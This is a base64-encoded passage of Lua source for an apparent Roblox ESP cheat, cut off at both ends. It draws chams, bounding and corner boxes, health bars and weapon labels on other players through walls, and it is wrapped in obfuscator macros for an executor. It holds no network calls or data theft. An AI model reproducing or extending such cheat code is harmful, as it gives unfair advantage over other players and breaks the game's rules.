AgICAgICAgICAgICAgICAgICAgIENoYW1zLkRlcHRoTW9kZSA9ICJBbHdheXNPblRvcCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENoYW1zLkZpbGxDb2xvciA9IENvbmZpZy5FU1AuRHJhd2luZy5DaGFtcy5GaWxsUkdCCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDaGFtcy5PdXRsaW5lQ29sb3IgPSBDb25maWcuRVNQLkRyYXdpbmcuQ2hhbXMuT3V0bGluZVJHQgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuRVNQLkRyYXdpbmcuQ2hhbXMuVGhlcm1hbCB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENoYW1zLk91dGxpbmVUcmFuc3BhcmVuY3kgPSBDb25maWcuRVNQLkRyYXdpbmcuQ2hhbXMuT3V0bGluZV9UcmFuc3BhcmVuY3kgLyAxMDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDaGFtcy5GaWxsVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkNoYW1zLkZpbGxfVHJhbnNwYXJlbmN5IC8gMTAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBkbyAtLSBcXCBSZXN0IGltIGxhenkgY3V6enkgYnJvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXN0YW5jZS5UZXh0U3Ryb2tlVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkRpc3RhbmNlcy5UcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpc3RhbmNlLlRleHRTaXplID0gQ29uZmlnLkVTUC5Gb250U2l6ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlzdGFuY2UuVGV4dENvbG9yMyA9IENvbmZpZy5FU1AuRHJhd2luZy5EaXN0YW5jZXMuUkdCCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXZWFwb24uVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IENvbmZpZy5FU1AuRHJhd2luZy5XZWFwb25zLlRyYW5zcGFyZW5jeQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV2VhcG9uLlRleHRTaXplID0gQ29uZmlnLkVTUC5Gb250U2l6ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV2VhcG9uLlRleHRDb2xvcjMgPSBDb25maWcuRVNQLkRyYXdpbmcuV2VhcG9ucy5XZWFwb25UZXh0UkdCCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkpCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgUGxheWVyc19FU1BbcGxyLk5hbWVdLkhlYWx0aF9DaGFuZ2VkID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGhlYWx0aF9jbGFtcGVkID0gbWF0aC5jbGFtcChIdW1hbm9pZC5IZWFsdGgsIDAsIEh1bWFub2lkLk1heEhlYWx0aCkKICAgICAgICAgICAgICAgICAgICBoZWFsdGggPSBoZWFsdGhfY2xhbXBlZCAvIEh1bWFub2lkLk1heEhlYWx0aDsKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICBQbGF5ZXJzX0VTUFtwbHIuTmFtZV0uSGVhbHRoX0NoYW5nZWQoKQoKICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3Bsci5OYW1lXS5DaGlsZF9BZGRlZCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKEl0ZW0pCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IEl0ZW06SXNBKCJUb29sIikgdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBuYW1lID0gcGxyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChJdGVtLk5hbWUpIGFuZCBJdGVtLk5hbWUgb3IgIk5vbmUiCgogICAgICAgICAgICAgICAgICAgIFdlYXBvbi5UZXh0ID0gbmFtZQogICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3Bsci5OYW1lXS5Ub29sQ29ubmVjdGlvbl9BZGRlZCA9IHBsci5DaGFyYWN0ZXIuQ2hpbGRBZGRlZDpDb25uZWN0KFBsYXllcnNfRVNQW3Bsci5OYW1lXS5DaGlsZF9BZGRlZCkKICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3Bsci5OYW1lXS5Ub29sQ29ubmVjdGlvbl9SZW1vdmVkID0gcGxyLkNoYXJhY3Rlci5DaGlsZFJlbW92ZWQ6Q29ubmVjdChQbGF5ZXJzX0VTUFtwbHIuTmFtZV0uQ2hpbGRfQWRkZWQpCgogICAgICAgICAgICAgICAgUGxheWVyc19FU1BbcGxyLk5hbWVdLkh1bWFub2lkQ29ubmVjdGlvbiA9IEh1bWFub2lkLkhlYWx0aENoYW5nZWQ6Q29ubmVjdChQbGF5ZXJzX0VTUFtwbHIuTmFtZV0uSGVhbHRoX0NoYW5nZWQpCgogICAgICAgICAgICAgICAgUGxheWVyc19FU1BbcGxyLk5hbWVdLkNoYXJhY3RlckFkZGVkID0gcGxyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoTFBIX0pJVF9NQVgoZnVuY3Rpb24oQ2hhcmFjdGVyKQogICAgICAgICAgICAgICAgICAgIEh1bWFub2lkID0gQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgIEhSUCA9IENoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3Bsci5OYW1lXS5Ub29sQ29ubmVjdGlvbl9BZGRlZDpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICBQbGF5ZXJzX0VTUFtwbHIuTmFtZV0uVG9vbENvbm5lY3Rpb25fUmVtb3ZlZDpEaXNjb25uZWN0KCkKCiAgICAgICAgICAgICAgICAgICAgUGxheWVyc19FU1BbcGxyLk5hbWVdLlRvb2xDb25uZWN0aW9uX1JlbW92ZWQgPSBuaWwKICAgICAgICAgICAgICAgICAgICBQbGF5ZXJzX0VTUFtwbHIuTmFtZV0uVG9vbENvbm5lY3Rpb25fQWRkZWQgPSBuaWwKCiAgICAgICAgICAgICAgICAgICAgUGxheWVyc19FU1BbcGxyLk5hbWVdLlRvb2xDb25uZWN0aW9uX0FkZGVkID0gcGxyLkNoYXJhY3Rlci5DaGlsZEFkZGVkOkNvbm5lY3QoUGxheWVyc19FU1BbcGxyLk5hbWVdLkNoaWxkX0FkZGVkKQogICAgICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3Bsci5OYW1lXS5Ub29sQ29ubmVjdGlvbl9SZW1vdmVkID0gcGxyLkNoYXJhY3Rlci5DaGlsZFJlbW92ZWQ6Q29ubmVjdChQbGF5ZXJzX0VTUFtwbHIuTmFtZV0uQ2hpbGRfQWRkZWQpCgogICAgICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3Bsci5OYW1lXS5IdW1hbm9pZENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgUGxheWVyc19FU1BbcGxyLk5hbWVdLkh1bWFub2lkQ29ubmVjdGlvbiA9IEh1bWFub2lkLkhlYWx0aENoYW5nZWQ6Q29ubmVjdChQbGF5ZXJzX0VTUFtwbHIuTmFtZV0uSGVhbHRoX0NoYW5nZWQpCiAgICAgICAgICAgICAgICAgICAgUGxheWVyc19FU1BbcGxyLk5hbWVdLkhlYWx0aF9DaGFuZ2VkKCkKICAgICAgICAgICAgICAgICAgICBQbGF5ZXJzX0VTUFtwbHIuTmFtZV0uUmVmcmVzaEVsZW1lbnRzKCkKICAgICAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICAgICAgUGxheWVyc19FU1BbcGxyLk5hbWVdLlJlZnJlc2hFbGVtZW50cygpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgVXBkYXRlciA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIENvbm5lY3Rpb247CiAgICAgICAgICAgICAgICBsb2NhbCBIaWRlRVNQID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIEJveC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgTmFtZS5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgRGlzdGFuY2UuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIFdlYXBvbi5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgSGVhbHRoYmFyLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBCZWhpbmRIZWFsdGhiYXIuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIEhlYWx0aFRleHQuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIFdlYXBvbkljb24uVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIExlZnRUb3AuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIExlZnRTaWRlLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBCb3R0b21TaWRlLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBCb3R0b21Eb3duLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBSaWdodFRvcC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgUmlnaHRTaWRlLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBCb3R0b21SaWdodFNpZGUuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIEJvdHRvbVJpZ2h0RG93bi5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgRmxhZzEuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIENoYW1zLkVuYWJsZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBGbGFnMi5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHBsciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFNjcmVlbkd1aTpEZXN0cm95KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbm5lY3Rpb246RGlzY29ubmVjdCgpOwogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgLS0KICAgICAgICAgICAgICAgIENvbm5lY3Rpb24gPSBFdXBob3JpYS5SdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgaWYgcGxyLkNoYXJhY3RlciBhbmQgbHBsYXllci5DaGFyYWN0ZXIgYW5kIENvbmZpZy5FU1AuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIEh1bWFub2lkIGFuZCBIUlAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zLCBPblNjcmVlbiA9IENhbTpXb3JsZFRvU2NyZWVuUG9pbnQoSFJQLlBvc2l0aW9uKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlzdCA9IChDYW0uQ0ZyYW1lLlBvc2l0aW9uIC0gSFJQLlBvc2l0aW9uKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgT25TY3JlZW4gYW5kIERpc3QgPD0gQ29uZmlnLkVTUC5NYXhEaXN0YW5jZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IEhSUC5TaXplLlkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgRGVmYXVsdFBsYXllclNldHRpbmdzW3Bsci5OYW1lXSBhbmQgRGVmYXVsdFBsYXllclNldHRpbmdzW3Bsci5OYW1lXS5Sb290U2V0dGluZ3MgYW5kIERlZmF1bHRQbGF5ZXJTZXR0aW5nc1twbHIuTmFtZV0uUm9vdFNldHRpbmdzLlNpemUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gRGVmYXVsdFBsYXllclNldHRpbmdzW3Bsci5OYW1lXS5Sb290U2V0dGluZ3MuU2l6ZS5ZCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NhbGVGYWN0b3IgPSAoU2l6ZSAqIENhbS5WaWV3cG9ydFNpemUuWSkgLyAoUG9zLlogKiAyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHcsIGggPSAzICogc2NhbGVGYWN0b3IsIDQuNSAqIHNjYWxlRmFjdG9yCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIEZhZGUtb3V0IGVmZmVjdCAtLQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5FU1AuRmFkZU91dC5PbkRpc3RhbmNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRnVuY3Rpb25zLkZhZGVPdXRPbkRpc3QoQm94LCBEaXN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGdW5jdGlvbnMuRmFkZU91dE9uRGlzdChPdXRsaW5lLCBEaXN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGdW5jdGlvbnMuRmFkZU91dE9uRGlzdChOYW1lLCBEaXN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGdW5jdGlvbnMuRmFkZU91dE9uRGlzdChEaXN0YW5jZSwgRGlzdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRnVuY3Rpb25zLkZhZGVPdXRPbkRpc3QoV2VhcG9uLCBEaXN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGdW5jdGlvbnMuRmFkZU91dE9uRGlzdChIZWFsdGhiYXIsIERpc3QpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZ1bmN0aW9ucy5GYWRlT3V0T25EaXN0KEJlaGluZEhlYWx0aGJhciwgRGlzdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRnVuY3Rpb25zLkZhZGVPdXRPbkRpc3QoSGVhbHRoVGV4dCwgRGlzdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRnVuY3Rpb25zLkZhZGVPdXRPbkRpc3QoV2VhcG9uSWNvbiwgRGlzdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRnVuY3Rpb25zLkZhZGVPdXRPbkRpc3QoTGVmdFRvcCwgRGlzdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRnVuY3Rpb25zLkZhZGVPdXRPbkRpc3QoTGVmdFNpZGUsIERpc3QpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZ1bmN0aW9ucy5GYWRlT3V0T25EaXN0KEJvdHRvbVNpZGUsIERpc3QpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZ1bmN0aW9ucy5GYWRlT3V0T25EaXN0KEJvdHRvbURvd24sIERpc3QpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZ1bmN0aW9ucy5GYWRlT3V0T25EaXN0KFJpZ2h0VG9wLCBEaXN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGdW5jdGlvbnMuRmFkZU91dE9uRGlzdChSaWdodFNpZGUsIERpc3QpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZ1bmN0aW9ucy5GYWRlT3V0T25EaXN0KEJvdHRvbVJpZ2h0U2lkZSwgRGlzdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRnVuY3Rpb25zLkZhZGVPdXRPbkRpc3QoQm90dG9tUmlnaHREb3duLCBEaXN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGdW5jdGlvbnMuRmFkZU91dE9uRGlzdChDaGFtcywgRGlzdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRnVuY3Rpb25zLkZhZGVPdXRPbkRpc3QoRmxhZzEsIERpc3QpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZ1bmN0aW9ucy5GYWRlT3V0T25EaXN0KEZsYWcyLCBEaXN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFRlYW1jaGVjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEhSUCBhbmQgSHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbyAtLSBDaGFtcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hhbXMuQWRvcm5lZSA9IHBsci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENoYW1zLkVuYWJsZWQgPSBDb25maWcuRVNQLkRyYXdpbmcuQ2hhbXMuRW5hYmxlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG8gLS0gQnJlYXRoZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5FU1AuRHJhd2luZy5DaGFtcy5UaGVybWFsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnJlYXRoZV9lZmZlY3QgPSBtYXRoLmF0YW4obWF0aC5zaW4odGljaygpICogMikpICogMiAvIG1hdGgucGkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hhbXMuRmlsbFRyYW5zcGFyZW5jeSA9IENvbmZpZy5FU1AuRHJhd2luZy5DaGFtcy5GaWxsX1RyYW5zcGFyZW5jeSAqIGJyZWF0aGVfZWZmZWN0ICogMC4wMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDaGFtcy5PdXRsaW5lVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkNoYW1zLk91dGxpbmVfVHJhbnNwYXJlbmN5ICogYnJlYXRoZV9lZmZlY3QgKiAwLjAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG8gLS0gQ29ybmVyIEJveGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkJvdW5kaW5nLkVuYWJsZWQgb3IgKENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuRW5hYmxlZCBhbmQgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkJvdW5kaW5nLkVuYWJsZWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMZWZ0VG9wLlZpc2libGUgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLkVuYWJsZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMZWZ0VG9wLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YIC0gdyAvIDIsIDAsIFBvcy5ZIC0gaCAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTGVmdFRvcC5TaXplID0gVURpbTIubmV3KDAsIHcgLyA1LCAwLCAxKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMZWZ0U2lkZS5WaXNpYmxlID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5FbmFibGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTGVmdFNpZGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgUG9zLlggLSB3IC8gMiwgMCwgUG9zLlkgLSBoIC8gMikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMZWZ0U2lkZS5TaXplID0gVURpbTIubmV3KDAsIDEsIDAsIGggLyA1KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21TaWRlLlZpc2libGUgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLkVuYWJsZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21TaWRlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YIC0gdyAvIDIsIDAsIFBvcy5ZICsgaCAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm90dG9tU2lkZS5TaXplID0gVURpbTIubmV3KDAsIDEsIDAsIGggLyA1KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21Eb3duLlZpc2libGUgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLkVuYWJsZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21Eb3duLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YIC0gdyAvIDIsIDAsIFBvcy5ZICsgaCAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm90dG9tRG93bi5TaXplID0gVURpbTIubmV3KDAsIHcgLyA1LCAwLCAxKQoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRUb3AuVmlzaWJsZSA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuRW5hYmxlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJpZ2h0VG9wLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YICsgdyAvIDIsIDAsIFBvcy5ZIC0gaCAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRUb3AuU2l6ZSA9IFVEaW0yLm5ldygwLCB3IC8gNSwgMCwgMSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRTaWRlLlZpc2libGUgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLkVuYWJsZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSaWdodFNpZGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgUG9zLlggKyB3IC8gMiAtIDEsIDAsIFBvcy5ZIC0gaCAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRTaWRlLlNpemUgPSBVRGltMi5uZXcoMCwgMSwgMCwgaCAvIDUpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbVJpZ2h0U2lkZS5WaXNpYmxlID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5FbmFibGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm90dG9tUmlnaHRTaWRlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YICsgdyAvIDIsIDAsIFBvcy5ZICsgaCAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm90dG9tUmlnaHRTaWRlLlNpemUgPSBVRGltMi5uZXcoMCwgMSwgMCwgaCAvIDUpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbVJpZ2h0RG93bi5WaXNpYmxlID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5FbmFibGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm90dG9tUmlnaHREb3duLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YICsgdyAvIDIsIDAsIFBvcy5ZICsgaCAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm90dG9tUmlnaHREb3duLlNpemUgPSBVRGltMi5uZXcoMCwgdyAvIDUsIDAsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbyAtLSAvLyBCb3VuZGluZyBCb3hlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTGVmdFRvcC5WaXNpYmxlID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkJvdW5kaW5nLkVuYWJsZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMZWZ0VG9wLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YIC0gdyAvIDIsIDAsIFBvcy5ZIC0gaCAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTGVmdFRvcC5TaXplID0gVURpbTIubmV3KDAsIHcsIDAsIDEpCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMZWZ0U2lkZS5WaXNpYmxlID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkJvdW5kaW5nLkVuYWJsZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMZWZ0U2lkZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCBQb3MuWCAtIHcgLyAyLCAwLCBQb3MuWSAtIGggLyAyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExlZnRTaWRlLlNpemUgPSBVRGltMi5uZXcoMCwgMSwgMCwgaCkKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbVNpZGUuVmlzaWJsZSA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Cb3VuZGluZy5FbmFibGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm90dG9tU2lkZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCBQb3MuWCAtIHcgLyAyLCAwLCBQb3MuWSArIGggLyAyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbVNpZGUuU2l6ZSA9IFVEaW0yLm5ldygwLCB3LCAwLCAxKSAKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJpZ2h0U2lkZS5WaXNpYmxlID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkJvdW5kaW5nLkVuYWJsZWQgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRTaWRlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YICsgdyAvIDIgLSAxLCAwLCBQb3MuWSAtIGggLyAyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJpZ2h0U2lkZS5TaXplID0gVURpbTIubmV3KDAsIDEsIDAsIGgpIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21SaWdodFNpZGUuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm90d